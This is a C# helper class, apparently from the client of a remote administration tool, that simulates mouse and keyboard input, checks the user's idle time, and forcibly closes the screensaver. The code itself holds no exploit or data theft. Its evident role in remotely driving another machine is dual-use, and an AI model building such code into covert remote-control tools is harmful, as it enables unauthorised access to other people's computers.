using System;
using System.Drawing;
using System.Runtime.InteropServices;
using xClient.Core.Utilities;

namespace xClient.Core.Helper
{
    public static class NativeMethodsHelper
    {
        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        private const uint MOUSEEVENTF_WHEEL = 0x0800;
        private const uint KEYEVENTF_KEYDOWN = 0x0000;
        private const uint KEYEVENTF_KEYUP = 0x0002;

        public static uint GetLastInputInfoTickCount()
        {
            NativeMethods.LASTINPUTINFO lastInputInfo = new NativeMethods.LASTINPUTINFO();
            lastInputInfo.cbSize = (uint) Marshal.SizeOf(lastInputInfo);
            lastInputInfo.dwTime = 0;

            return NativeMethods.GetLastInputInfo(ref lastInputInfo) ? lastInputInfo.dwTime : 0;
        }

        public static void DoMouseLeftClick(Point p, bool isMouseDown)
        {
            NativeMethods.mouse_event(isMouseDown ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP, p.X, p.Y, 0, 0);
        }

        public static void DoMouseRightClick(Point p, bool isMouseDown)
        {
            NativeMethods.mouse_event(isMouseDown ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP, p.X, p.Y, 0, 0);
        }

        public static void DoMouseMove(Point p)
        {
            NativeMethods.SetCursorPos(p.X, p.Y);
        }

        public static void DoMouseScroll(Point p, bool scrollDown)
        {
            NativeMethods.mouse_event(MOUSEEVENTF_WHEEL, p.X, p.Y, scrollDown ? -120 : 120, 0);
        }

        public static void DoKeyPress(byte key, bool keyDown)
        {
            NativeMethods.keybd_event(key, 0, keyDown ? KEYEVENTF_KEYDOWN : KEYEVENTF_KEYUP, 0);
        }

        private const int SPI_GETSCREENSAVERRUNNING = 114;

        public static bool IsScreensaverActive()
        {
            var running = IntPtr.Zero;

            if (!NativeMethods.SystemParametersInfo(
                SPI_GETSCREENSAVERRUNNING,
                0,
                ref running,
                0))
            {
                // Something went wrong (Marshal.GetLastWin32Error)
            }

            return running != IntPtr.Zero;
        }

        private const uint DESKTOP_WRITEOBJECTS = 0x0080;
        private const uint DESKTOP_READOBJECTS = 0x0001;
        private const int WM_CLOSE = 16;
        private const uint SPI_SETSCREENSAVEACTIVE = 0x0011;
        private const uint SPIF_SENDWININICHANGE = 0x0002;

        public static void DisableScreensaver()
        {
            var handle = NativeMethods.OpenDesktop("Screen-saver", 0,
                false, DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS);

            if (handle != IntPtr.Zero)
            {
                NativeMethods.EnumDesktopWindows(handle, (hWnd, lParam) =>
                {
                    if (NativeMethods.IsWindowVisible(hWnd))
                        NativeMethods.PostMessage(hWnd, WM_CLOSE, 0, 0);

                    // Continue enumeration even if it fails
                    return true;
                },
                    IntPtr.Zero);
                NativeMethods.CloseDesktop(handle);
            }
            else
            {
                NativeMethods.PostMessage(NativeMethods.GetForegroundWindow(), WM_CLOSE,
                    0, 0);
            }

            // We need to restart the counter for next screensaver according to
            // https://support.microsoft.com/en-us/kb/140723
            // (this may not be needed since we simulate mouse click afterwards)

            var dummy = IntPtr.Zero;

            // Doesn't really matter if this fails
            NativeMethods.SystemParametersInfo(SPI_SETSCREENSAVEACTIVE, 1 /* TRUE */, ref dummy, SPIF_SENDWININICHANGE);

        }
    }
}
